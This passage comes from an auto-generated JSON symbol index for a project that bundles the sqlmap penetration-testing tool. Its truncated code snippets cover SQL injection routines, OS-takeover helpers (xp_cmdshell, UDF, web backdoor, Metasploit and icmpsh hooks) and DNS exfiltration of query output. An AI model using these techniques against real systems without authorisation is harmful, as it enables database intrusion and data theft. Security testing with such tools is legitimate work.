        "peekOfCode": "class HTTPRangeHandler(_urllib.request.BaseHandler):\n    \"\"\"\n    Handler that enables HTTP Range headers.\n    Reference: http://stackoverflow.com/questions/1971240/python-seek-on-remote-file\n    \"\"\"\n    def http_error_206(self, req, fp, code, msg, hdrs):\n        # 206 Partial Content Response\n        r = _urllib.response.addinfourl(fp, hdrs, req.get_full_url())\n        r.code = code\n        r.msg = msg",
        "detail": "VulnScan.modules.sqlmap.lib.request.rangehandler",
        "documentation": {}
    },
    {
        "label": "SmartRedirectHandler",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.request.redirecthandler",
        "description": "VulnScan.modules.sqlmap.lib.request.redirecthandler",
        "peekOfCode": "class SmartRedirectHandler(_urllib.request.HTTPRedirectHandler):\n    def _get_header_redirect(self, headers):\n        retVal = None\n        if headers:\n            if HTTP_HEADER.LOCATION in headers:\n                retVal = headers[HTTP_HEADER.LOCATION]\n            elif HTTP_HEADER.URI in headers:\n                retVal = headers[HTTP_HEADER.URI]\n        return retVal\n    def _ask_redirect_choice(self, redcode, redurl, method):",
        "detail": "VulnScan.modules.sqlmap.lib.request.redirecthandler",
        "documentation": {}
    },
    {
        "label": "getPageTemplate",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.request.templates",
        "description": "VulnScan.modules.sqlmap.lib.request.templates",
        "peekOfCode": "def getPageTemplate(payload, place):\n    retVal = (kb.originalPage, kb.errorIsNone)\n    if payload and place:\n        if (payload, place) not in kb.pageTemplates:\n            page, _, _ = Request.queryPage(payload, place, content=True, raise404=False)\n            kb.pageTemplates[(payload, place)] = (page, kb.lastParserStatus is None)\n        retVal = kb.pageTemplates[(payload, place)]\n    return retVal",
        "detail": "VulnScan.modules.sqlmap.lib.request.templates",
        "documentation": {}
    },
    {
        "label": "Abstraction",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.takeover.abstraction",
        "description": "VulnScan.modules.sqlmap.lib.takeover.abstraction",
        "peekOfCode": "class Abstraction(Web, UDF, XP_cmdshell):\n    \"\"\"\n    This class defines an abstraction layer for OS takeover functionalities\n    to UDF / XP_cmdshell objects\n    \"\"\"\n    def __init__(self):\n        self.envInitialized = False\n        self.alwaysRetrieveCmdOutput = False\n        UDF.__init__(self)\n        Web.__init__(self)",
        "detail": "VulnScan.modules.sqlmap.lib.takeover.abstraction",
        "documentation": {}
    },
    {
        "label": "ICMPsh",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.takeover.icmpsh",
        "description": "VulnScan.modules.sqlmap.lib.takeover.icmpsh",
        "peekOfCode": "class ICMPsh(object):\n    \"\"\"\n    This class defines methods to call icmpsh for plugins.\n    \"\"\"\n    def _initVars(self):\n        self.lhostStr = None\n        self.rhostStr = None\n        self.localIP = getLocalIP()\n        self.remoteIP = getRemoteIP() or conf.hostname\n        self._icmpslave = normalizePath(os.path.join(paths.SQLMAP_EXTRAS_PATH, \"icmpsh\", \"icmpsh.exe_\"))",
        "detail": "VulnScan.modules.sqlmap.lib.takeover.icmpsh",
        "documentation": {}
    },
    {
        "label": "Metasploit",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.takeover.metasploit",
        "description": "VulnScan.modules.sqlmap.lib.takeover.metasploit",
        "peekOfCode": "class Metasploit(object):\n    \"\"\"\n    This class defines methods to call Metasploit for plugins.\n    \"\"\"\n    def _initVars(self):\n        self.connectionStr = None\n        self.lhostStr = None\n        self.rhostStr = None\n        self.portStr = None\n        self.payloadStr = None",
        "detail": "VulnScan.modules.sqlmap.lib.takeover.metasploit",
        "documentation": {}
    },
    {
        "label": "Registry",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.takeover.registry",
        "description": "VulnScan.modules.sqlmap.lib.takeover.registry",
        "peekOfCode": "class Registry(object):\n    \"\"\"\n    This class defines methods to read and write Windows registry keys\n    \"\"\"\n    def _initVars(self, regKey, regValue, regType=None, regData=None, parse=False):\n        self._regKey = regKey\n        self._regValue = regValue\n        self._regType = regType\n        self._regData = regData\n        self._randStr = randomStr(lowercase=True)",
        "detail": "VulnScan.modules.sqlmap.lib.takeover.registry",
        "documentation": {}
    },
    {
        "label": "UDF",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.takeover.udf",
        "description": "VulnScan.modules.sqlmap.lib.takeover.udf",
        "peekOfCode": "class UDF(object):\n    \"\"\"\n    This class defines methods to deal with User-Defined Functions for\n    plugins.\n    \"\"\"\n    def __init__(self):\n        self.createdUdf = set()\n        self.udfs = {}\n        self.udfToCreate = set()\n    def _askOverwriteUdf(self, udf):",
        "detail": "VulnScan.modules.sqlmap.lib.takeover.udf",
        "documentation": {}
    },
    {
        "label": "Web",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.takeover.web",
        "description": "VulnScan.modules.sqlmap.lib.takeover.web",
        "peekOfCode": "class Web(object):\n    \"\"\"\n    This class defines web-oriented OS takeover functionalities for\n    plugins.\n    \"\"\"\n    def __init__(self):\n        self.webPlatform = None\n        self.webBaseUrl = None\n        self.webBackdoorUrl = None\n        self.webBackdoorFilePath = None",
        "detail": "VulnScan.modules.sqlmap.lib.takeover.web",
        "documentation": {}
    },
    {
        "label": "XP_cmdshell",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.takeover.xp_cmdshell",
        "description": "VulnScan.modules.sqlmap.lib.takeover.xp_cmdshell",
        "peekOfCode": "class XP_cmdshell(object):\n    \"\"\"\n    This class defines methods to deal with Microsoft SQL Server\n    xp_cmdshell extended procedure for plugins.\n    \"\"\"\n    def __init__(self):\n        self.xpCmdshellStr = \"master..xp_cmdshell\"\n    def _xpCmdshellCreate(self):\n        cmd = \"\"\n        if not Backend.isVersionWithin((\"2000\",)):",
        "detail": "VulnScan.modules.sqlmap.lib.takeover.xp_cmdshell",
        "documentation": {}
    },
    {
        "label": "bisection",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.techniques.blind.inference",
        "description": "VulnScan.modules.sqlmap.lib.techniques.blind.inference",
        "peekOfCode": "def bisection(payload, expression, length=None, charsetType=None, firstChar=None, lastChar=None, dump=False):\n    \"\"\"\n    Bisection algorithm that can be used to perform blind SQL injection\n    on an affected host\n    \"\"\"\n    abortedFlag = False\n    showEta = False\n    partialValue = u\"\"\n    finalValue = None\n    retrievedLength = 0",
        "detail": "VulnScan.modules.sqlmap.lib.techniques.blind.inference",
        "documentation": {}
    },
    {
        "label": "queryOutputLength",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.techniques.blind.inference",
        "description": "VulnScan.modules.sqlmap.lib.techniques.blind.inference",
        "peekOfCode": "def queryOutputLength(expression, payload):\n    \"\"\"\n    Returns the query output length.\n    \"\"\"\n    infoMsg = \"retrieving the length of query output\"\n    logger.info(infoMsg)\n    start = time.time()\n    lengthExprUnescaped = agent.forgeQueryOutputLength(expression)\n    count, length = bisection(payload, lengthExprUnescaped, charsetType=CHARSET_TYPE.DIGITS)\n    debugMsg = \"performed %d quer%s in %.2f seconds\" % (count, 'y' if count == 1 else \"ies\", calculateDeltaSeconds(start))",
        "detail": "VulnScan.modules.sqlmap.lib.techniques.blind.inference",
        "documentation": {}
    },
    {
        "label": "dnsTest",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.techniques.dns.test",
        "description": "VulnScan.modules.sqlmap.lib.techniques.dns.test",
        "peekOfCode": "def dnsTest(payload):\n    logger.info(\"testing for data retrieval through DNS channel\")\n    randInt = randomInt()\n    kb.dnsTest = dnsUse(payload, \"SELECT %d%s\" % (randInt, FROM_DUMMY_TABLE.get(Backend.getIdentifiedDbms(), \"\"))) == str(randInt)\n    if not kb.dnsTest:\n        errMsg = \"data retrieval through DNS channel failed\"\n        if not conf.forceDns:\n            conf.dnsDomain = None\n            errMsg += \". Turning off DNS exfiltration support\"\n            logger.error(errMsg)",
        "detail": "VulnScan.modules.sqlmap.lib.techniques.dns.test",
        "documentation": {}
    },
    {
        "label": "dnsUse",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.techniques.dns.use",
        "description": "VulnScan.modules.sqlmap.lib.techniques.dns.use",
        "peekOfCode": "def dnsUse(payload, expression):\n    \"\"\"\n    Retrieve the output of a SQL query taking advantage of the DNS\n    resolution mechanism by making request back to attacker's machine.\n    \"\"\"\n    start = time.time()\n    retVal = None\n    count = 0\n    offset = 1\n    if conf.dnsDomain and Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.ORACLE, DBMS.MYSQL, DBMS.PGSQL):",
        "detail": "VulnScan.modules.sqlmap.lib.techniques.dns.use",
        "documentation": {}
    },
    {
        "label": "errorUse",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.techniques.error.use",
        "description": "VulnScan.modules.sqlmap.lib.techniques.error.use",
        "peekOfCode": "def errorUse(expression, dump=False):\n    \"\"\"\n    Retrieve the output of a SQL query taking advantage of the error-based\n    SQL injection vulnerability on the affected parameter.\n    \"\"\"\n    initTechnique(getTechnique())\n    abortedFlag = False\n    count = None\n    emptyFields = []\n    start = time.time()",
        "detail": "VulnScan.modules.sqlmap.lib.techniques.error.use",
        "documentation": {}
    },
    {
        "label": "unionTest",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.techniques.union.test",
        "description": "VulnScan.modules.sqlmap.lib.techniques.union.test",
        "peekOfCode": "def unionTest(comment, place, parameter, value, prefix, suffix):\n    \"\"\"\n    This method tests if the target URL is affected by an union\n    SQL injection vulnerability. The test is done up to 3*50 times\n    \"\"\"\n    if conf.direct:\n        return\n    negativeLogic = kb.negativeLogic\n    setTechnique(PAYLOAD.TECHNIQUE.UNION)\n    try:",
        "detail": "VulnScan.modules.sqlmap.lib.techniques.union.test",
        "documentation": {}
    },
    {
        "label": "configUnion",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.techniques.union.use",
        "description": "VulnScan.modules.sqlmap.lib.techniques.union.use",
        "peekOfCode": "def configUnion(char=None, columns=None):\n    def _configUnionChar(char):\n        if not isinstance(char, six.string_types):\n            return\n        kb.uChar = char\n        if conf.uChar is not None:\n            kb.uChar = char.replace(\"[CHAR]\", conf.uChar if isDigit(conf.uChar) else \"'%s'\" % conf.uChar.strip(\"'\"))\n    def _configUnionCols(columns):\n        if not isinstance(columns, six.string_types):\n            return",
        "detail": "VulnScan.modules.sqlmap.lib.techniques.union.use",
        "documentation": {}
    },
    {
        "label": "unionUse",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.techniques.union.use",
        "description": "VulnScan.modules.sqlmap.lib.techniques.union.use",
        "peekOfCode": "def unionUse(expression, unpack=True, dump=False):\n    \"\"\"\n    This function tests for an UNION SQL injection on the target\n    URL then call its subsidiary function to effectively perform an\n    UNION SQL injection on the affected URL\n    \"\"\"\n    initTechnique(PAYLOAD.TECHNIQUE.UNION)\n    abortedFlag = False\n    count = None\n    origExpr = expression",
        "detail": "VulnScan.modules.sqlmap.lib.techniques.union.use",
        "documentation": {}
    },
    {
        "label": "DataStore",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "class DataStore(object):\n    admin_token = \"\"\n    current_db = None\n    tasks = dict()\n    username = None\n    password = None\n# API objects\nclass Database(object):\n    filepath = None\n    def __init__(self, database=None):",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "Database",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "class Database(object):\n    filepath = None\n    def __init__(self, database=None):\n        self.database = self.filepath if database is None else database\n        self.connection = None\n        self.cursor = None\n    def connect(self, who=\"server\"):\n        self.connection = sqlite3.connect(self.database, timeout=3, isolation_level=None, check_same_thread=False)\n        self.cursor = self.connection.cursor()\n        self.lock = threading.Lock()",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "Task",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "class Task(object):\n    def __init__(self, taskid, remote_addr):\n        self.remote_addr = remote_addr\n        self.process = None\n        self.output_directory = None\n        self.options = None\n        self._original_options = None\n        self.initialize_options(taskid)\n    def initialize_options(self, taskid):\n        datatype = {\"boolean\": False, \"string\": None, \"integer\": None, \"float\": None}",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "StdDbOut",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "class StdDbOut(object):\n    def __init__(self, taskid, messagetype=\"stdout\"):\n        # Overwrite system standard output and standard error to write\n        # to an IPC database\n        self.messagetype = messagetype\n        self.taskid = taskid\n        if self.messagetype == \"stdout\":\n            sys.stdout = self\n        else:\n            sys.stderr = self",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "LogRecorder",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "class LogRecorder(logging.StreamHandler):\n    def emit(self, record):\n        \"\"\"\n        Record emitted events to IPC database for asynchronous I/O\n        communication with the parent process\n        \"\"\"\n        conf.databaseCursor.execute(\"INSERT INTO logs VALUES(NULL, ?, ?, ?, ?)\", (conf.taskid, time.strftime(\"%X\"), record.levelname, record.msg % record.args if record.args else record.msg))\ndef setRestAPILog():\n    if conf.api:\n        try:",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "setRestAPILog",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def setRestAPILog():\n    if conf.api:\n        try:\n            conf.databaseCursor = Database(conf.database)\n            conf.databaseCursor.connect(\"client\")\n        except sqlite3.OperationalError as ex:\n            raise SqlmapConnectionException(\"%s ('%s')\" % (ex, conf.database))\n        # Set a logging handler that writes log messages to a IPC database\n        logger.removeHandler(LOGGER_HANDLER)\n        LOGGER_RECORDER = LogRecorder()",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "is_admin",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def is_admin(token):\n    return DataStore.admin_token == token\n@hook('before_request')\ndef check_authentication():\n    if not any((DataStore.username, DataStore.password)):\n        return\n    authorization = request.headers.get(\"Authorization\", \"\")\n    match = re.search(r\"(?i)\\ABasic\\s+([^\\s]+)\", authorization)\n    if not match:\n        request.environ[\"PATH_INFO\"] = \"/error/401\"",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "check_authentication",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def check_authentication():\n    if not any((DataStore.username, DataStore.password)):\n        return\n    authorization = request.headers.get(\"Authorization\", \"\")\n    match = re.search(r\"(?i)\\ABasic\\s+([^\\s]+)\", authorization)\n    if not match:\n        request.environ[\"PATH_INFO\"] = \"/error/401\"\n    try:\n        creds = decodeBase64(match.group(1), binary=False)\n    except:",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "security_headers",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def security_headers(json_header=True):\n    \"\"\"\n    Set some headers across all HTTP responses\n    \"\"\"\n    response.headers[\"Server\"] = \"Server\"\n    response.headers[\"X-Content-Type-Options\"] = \"nosniff\"\n    response.headers[\"X-Frame-Options\"] = \"DENY\"\n    response.headers[\"X-XSS-Protection\"] = \"1; mode=block\"\n    response.headers[\"Pragma\"] = \"no-cache\"\n    response.headers[\"Cache-Control\"] = \"no-cache\"",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "error401",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def error401(error=None):\n    security_headers(False)\n    return \"Access denied\"\n@return_error(404)  # Not Found\ndef error404(error=None):\n    security_headers(False)\n    return \"Nothing here\"\n@return_error(405)  # Method Not Allowed (e.g. when requesting a POST method via GET)\ndef error405(error=None):\n    security_headers(False)",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "error404",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def error404(error=None):\n    security_headers(False)\n    return \"Nothing here\"\n@return_error(405)  # Method Not Allowed (e.g. when requesting a POST method via GET)\ndef error405(error=None):\n    security_headers(False)\n    return \"Method not allowed\"\n@return_error(500)  # Internal Server Error\ndef error500(error=None):\n    security_headers(False)",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "error405",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def error405(error=None):\n    security_headers(False)\n    return \"Method not allowed\"\n@return_error(500)  # Internal Server Error\ndef error500(error=None):\n    security_headers(False)\n    return \"Internal server error\"\n#############\n# Auxiliary #\n#############",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "error500",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def error500(error=None):\n    security_headers(False)\n    return \"Internal server error\"\n#############\n# Auxiliary #\n#############\n@get('/error/401')\ndef path_401():\n    response.status = 401\n    return response",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "path_401",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def path_401():\n    response.status = 401\n    return response\n#############################\n# Task management functions #\n#############################\n# Users' methods\n@get(\"/task/new\")\ndef task_new():\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "task_new",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def task_new():\n    \"\"\"\n    Create a new task\n    \"\"\"\n    taskid = encodeHex(os.urandom(8), binary=False)\n    remote_addr = request.remote_addr\n    DataStore.tasks[taskid] = Task(taskid, remote_addr)\n    logger.debug(\"Created new task: '%s'\" % taskid)\n    return jsonize({\"success\": True, \"taskid\": taskid})\n@get(\"/task/<taskid>/delete\")",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "task_delete",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def task_delete(taskid):\n    \"\"\"\n    Delete an existing task\n    \"\"\"\n    if taskid in DataStore.tasks:\n        DataStore.tasks.pop(taskid)\n        logger.debug(\"(%s) Deleted task\" % taskid)\n        return jsonize({\"success\": True})\n    else:\n        response.status = 404",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "task_list",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def task_list(token=None):\n    \"\"\"\n    Pull task list\n    \"\"\"\n    tasks = {}\n    for key in DataStore.tasks:\n        if is_admin(token) or DataStore.tasks[key].remote_addr == request.remote_addr:\n            tasks[key] = dejsonize(scan_status(key))[\"status\"]\n    logger.debug(\"(%s) Listed task pool (%s)\" % (token, \"admin\" if is_admin(token) else request.remote_addr))\n    return jsonize({\"success\": True, \"tasks\": tasks, \"tasks_num\": len(tasks)})",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "task_flush",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def task_flush(token=None):\n    \"\"\"\n    Flush task spool (delete all tasks)\n    \"\"\"\n    for key in list(DataStore.tasks):\n        if is_admin(token) or DataStore.tasks[key].remote_addr == request.remote_addr:\n            DataStore.tasks[key].engine_kill()\n            del DataStore.tasks[key]\n    logger.debug(\"(%s) Flushed task pool (%s)\" % (token, \"admin\" if is_admin(token) else request.remote_addr))\n    return jsonize({\"success\": True})",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "option_list",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def option_list(taskid):\n    \"\"\"\n    List options for a certain task ID\n    \"\"\"\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to option_list()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n    logger.debug(\"(%s) Listed task options\" % taskid)\n    return jsonize({\"success\": True, \"options\": DataStore.tasks[taskid].get_options()})\n@post(\"/option/<taskid>/get\")",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "option_get",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def option_get(taskid):\n    \"\"\"\n    Get value of option(s) for a certain task ID\n    \"\"\"\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to option_get()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n    options = request.json or []\n    results = {}\n    for option in options:",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "option_set",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def option_set(taskid):\n    \"\"\"\n    Set value of option(s) for a certain task ID\n    \"\"\"\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to option_set()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n    if request.json is None:\n        logger.warning(\"[%s] Invalid JSON options provided to option_set()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid JSON options\"})",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "scan_start",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def scan_start(taskid):\n    \"\"\"\n    Launch a scan\n    \"\"\"\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to scan_start()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n    if request.json is None:\n        logger.warning(\"[%s] Invalid JSON options provided to scan_start()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid JSON options\"})",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "scan_stop",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def scan_stop(taskid):\n    \"\"\"\n    Stop a scan\n    \"\"\"\n    if (taskid not in DataStore.tasks or DataStore.tasks[taskid].engine_process() is None or DataStore.tasks[taskid].engine_has_terminated()):\n        logger.warning(\"[%s] Invalid task ID provided to scan_stop()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n    DataStore.tasks[taskid].engine_stop()\n    logger.debug(\"(%s) Stopped scan\" % taskid)\n    return jsonize({\"success\": True})",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "scan_kill",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def scan_kill(taskid):\n    \"\"\"\n    Kill a scan\n    \"\"\"\n    if (taskid not in DataStore.tasks or DataStore.tasks[taskid].engine_process() is None or DataStore.tasks[taskid].engine_has_terminated()):\n        logger.warning(\"[%s] Invalid task ID provided to scan_kill()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n    DataStore.tasks[taskid].engine_kill()\n    logger.debug(\"(%s) Killed scan\" % taskid)\n    return jsonize({\"success\": True})",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "scan_status",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def scan_status(taskid):\n    \"\"\"\n    Returns status of a scan\n    \"\"\"\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to scan_status()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n    if DataStore.tasks[taskid].engine_process() is None:\n        status = \"not running\"\n    else:",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "scan_data",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def scan_data(taskid):\n    \"\"\"\n    Retrieve the data of a scan\n    \"\"\"\n    json_data_message = list()\n    json_errors_message = list()\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to scan_data()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n    # Read all data from the IPC database for the taskid",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "scan_log_limited",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def scan_log_limited(taskid, start, end):\n    \"\"\"\n    Retrieve a subset of log messages\n    \"\"\"\n    json_log_messages = list()\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to scan_log_limited()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n    if not start.isdigit() or not end.isdigit() or int(end) < int(start):\n        logger.warning(\"[%s] Invalid start or end value provided to scan_log_limited()\" % taskid)",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "scan_log",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def scan_log(taskid):\n    \"\"\"\n    Retrieve the log messages\n    \"\"\"\n    json_log_messages = list()\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to scan_log()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n    # Read all log messages from the IPC database\n    for time_, level, message in DataStore.current_db.execute(\"SELECT time, level, message FROM logs WHERE taskid = ? ORDER BY id ASC\", (taskid,)):",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "download",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def download(taskid, target, filename):\n    \"\"\"\n    Download a certain file from the file system\n    \"\"\"\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to download()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n    path = os.path.abspath(os.path.join(paths.SQLMAP_OUTPUT_PATH, target, filename))\n    # Prevent file path traversal\n    if not path.startswith(paths.SQLMAP_OUTPUT_PATH):",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "version",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def version(token=None):\n    \"\"\"\n    Fetch server version\n    \"\"\"\n    logger.debug(\"Fetched version (%s)\" % (\"admin\" if is_admin(token) else request.remote_addr))\n    return jsonize({\"success\": True, \"version\": VERSION_STRING.split('/')[-1]})\ndef server(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT, adapter=RESTAPI_DEFAULT_ADAPTER, username=None, password=None):\n    \"\"\"\n    REST-JSON API server\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "server",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
